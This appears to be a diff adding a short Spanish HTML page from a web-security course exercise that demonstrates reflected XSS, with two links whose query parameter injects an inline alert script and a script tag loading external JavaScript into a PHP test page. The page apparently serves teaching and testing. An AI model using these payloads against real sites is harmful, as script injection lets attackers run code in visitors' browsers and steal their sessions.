@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta http-equiv="X-UA-Compatible" content="ie=edge">
+        <title>vulnerabilidades</title>
+    </head>
+    <body>
+        <ul>
+            <li>vulnerabilidad XSS reflejada</li>
+            <li><a href="https://curso1819-izvdamdaw.c9users.io/seguridad/prueba.php?valor=dato<script>alert(1);</script>
+">uno</a></li>
+            <li><a href='https://curso1819-izvdamdaw.c9users.io/seguridad/prueba.php?valor=dato<script src="https://curso1819-izvdamdaw.c9users.io/seguridad/js/script.js"></script>'>dos</a></li>
+        </ul>
+    </body>
+</html>
